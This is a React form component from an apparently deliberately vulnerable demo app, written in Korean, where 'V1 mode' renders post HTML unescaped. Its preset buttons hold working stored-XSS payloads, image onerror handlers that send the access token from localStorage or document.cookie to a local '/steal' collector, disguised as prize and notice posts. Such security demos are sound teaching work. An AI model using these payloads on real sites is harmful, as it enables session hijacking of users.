"use client";

import { UseFormRegister, FieldErrors } from "react-hook-form";
import { CreatePostInput } from "@/schemas/post.schema";

// XSS 페이로드 프리셋
const XSS_PRESETS = [
  {
    label: "토큰 탈취 (V1 공격)",
    title: "🎁 이벤트 당첨 안내",
    content: `<p>축하합니다! 당첨되셨습니다.</p>\n<img src=x onerror="fetch('http://localhost:4999/steal?t='+localStorage.getItem('at'))">`,
  },
  {
    label: "쿠키 탈취 시도",
    title: "공지사항",
    content: `<p>서비스 안내입니다.</p>\n<img src=x onerror="fetch('http://localhost:4999/steal?t='+document.cookie)">`,
  },
  {
    label: "alert 테스트",
    title: "XSS 테스트",
    content: `<img src=x onerror="alert('XSS! mode:'+localStorage.getItem('at')?.slice(0,20))">`,
  },
  {
    label: "단순 텍스트 (정상)",
    title: "일반 게시글",
    content: "안녕하세요. 정상적인 게시글입니다.",
  },
];

interface Props {
  register: UseFormRegister<CreatePostInput>;
  handleSubmit: (e: React.FormEvent) => void;
  errors: FieldErrors<CreatePostInput>;
  isPending: boolean;
  serverError: string | null;
  onPreset: (title: string, content: string) => void;
}

export function PostFormView({
  register,
  handleSubmit,
  errors,
  isPending,
  serverError,
  onPreset,
}: Props) {
  return (
    <div className="rounded-lg border border-gray-200 bg-white p-5">
      <h3 className="mb-1 text-sm font-semibold text-gray-700">게시글 작성</h3>
      <p className="mb-4 text-xs text-gray-400">
        V1 모드에서는 HTML이 그대로 렌더링됩니다 — XSS 페이로드를 직접
        삽입해보세요.
      </p>

      {/* 프리셋 버튼 */}
      <div className="mb-4 flex flex-wrap gap-2">
        {XSS_PRESETS.map((p) => (
          <button
            key={p.label}
            type="button"
            onClick={() => onPreset(p.title, p.content)}
            className="rounded border border-dashed border-red-300 bg-red-50 px-2 py-1 text-xs text-red-700 hover:bg-red-100"
          >
            {p.label}
          </button>
        ))}
      </div>

      <form onSubmit={handleSubmit} className="space-y-3">
        <div>
          <input
            {...register("title")}
            placeholder="제목"
            className="w-full rounded border border-gray-300 px-3 py-2 text-sm focus:border-blue-500 focus:outline-none"
          />
          {errors.title && (
            <p className="mt-1 text-xs text-red-500">{errors.title.message}</p>
          )}
        </div>

        <div>
          <textarea
            {...register("content")}
            placeholder={`내용 (HTML 직접 입력 가능)\n`}
            rows={5}
            className="w-full rounded border border-gray-300 px-3 py-2 font-mono text-sm focus:border-blue-500 focus:outline-none"
          />
          {errors.content && (
            <p className="mt-1 text-xs text-red-500">
              {errors.content.message}
            </p>
          )}
        </div>

        {serverError && <p className="text-xs text-red-600">{serverError}</p>}

        <button
          type="submit"
          disabled={isPending}
          className="rounded bg-blue-600 px-4 py-2 text-sm text-white hover:bg-blue-700 disabled:opacity-50"
        >
          {isPending ? "등록 중..." : "게시글 등록"}
        </button>
      </form>
    </div>
  );
}
